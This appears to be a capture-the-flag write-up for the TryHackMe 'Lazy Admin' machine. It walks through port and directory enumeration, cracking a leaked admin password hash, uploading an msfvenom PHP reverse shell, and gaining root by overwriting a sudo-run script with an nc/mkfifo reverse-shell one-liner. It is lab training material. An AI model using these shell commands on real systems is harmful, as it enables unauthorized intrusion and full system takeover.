# Lazy Admin

## Reconnaissance
Let's start the enumeration with scanning the ports, which we can do with nmap. This can be done with the command nmap -A -T4 <ip>.

![nmap](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/nmap.png)

As we can see there are two ports open, port 22 for ssh and port 80 for http. The SSH version running is OpenSSH 7.2p2 and the server is an Apache server running on ubuntu. For further enumeration we can use ffuf with the command ```ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<ip>/FUZZ"```.

![fuzzing1](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/fuzzing.png)

```/content``` seems interesting, so let's check it out. Hmm, that did not give us much.

![content](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/content.png)

Let's try fuzzing even deeper, we can do this with the command ```ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<ip>/content/FUZZ"```

![fuzzing2](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/fuzzing2.png)

```/as``` seems interesting, so lets check it out, oh an admin panel. We could try to brute-force it, but let's continue searching to see if we can find anything else that might be interesting.

![login](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/login.png)

We can find an backup of an mysql database at ```<ip>/content/inc/mysql_backup```, lets try downloading it to see what it contains.

![sql](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/sql.png)

Here we can find both a username and an hashed password, maybe if we can crack the password we can use it to login to the admin panel.

![sql_pass](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/sql_pass.png)

I used ```https://crackstation.net/``` to crack the password.

![pass_cracked](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/pass_cracked.png)

Now we can log in to the admin panel. 

![admin](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/admin_panel.png)

## Getting a shell
Now that we have gotten into the admin panel, it's time to look for a way to get a shell. After looking around on the admin panel for a litte while I found an upload button, lets see if we can upload a reverse shell through the upload form. 

![upload](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/upload.png)

We can create an reverse shell with the command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```. Now we can try to upload it, it worked! Now we can go to ```<ip>/content/attachment/shell.php5``` and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload php/meterpreter_reverse_tcp. Set the options ```LHOST <your ip>``` and ```LPORT <choosen port>```.

![msf](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/msf.png)

That worked, we now have gotten into the computer.

![user](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/user.png)

## Privilege Escalation
Now that we have gotten into the computer it's time for privilege escalation, so let's do some enumeration. ```sudo -l``` shows us that we can use ```/user/bin/perl /home/itguy/backup.pl``` as root.

![priv_esc](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/priv_esc.png)

Let's check out the ```/home/itguy/backup.pl``` file.

![priv_esc2](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/priv_esc2.png)

Ok, now lets check out the ```/etc/copy.sh``` file.

![priv_esc3](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/priv_esc3.png)

It seems like most of the job is done for us. Let's change the ip to our ip. We can do this with ```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> 5554 >/tmp/f" > /etc/copy.sh```

We can now try to catch it with netcat on our computer with ```nc -nvlp 5554``` and then run ``backup.pl`` with ```sudo /usr/bin/perl /home/itguy/backup.pl```

![root](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/root.png)

That worked, we have now root access on the machine.
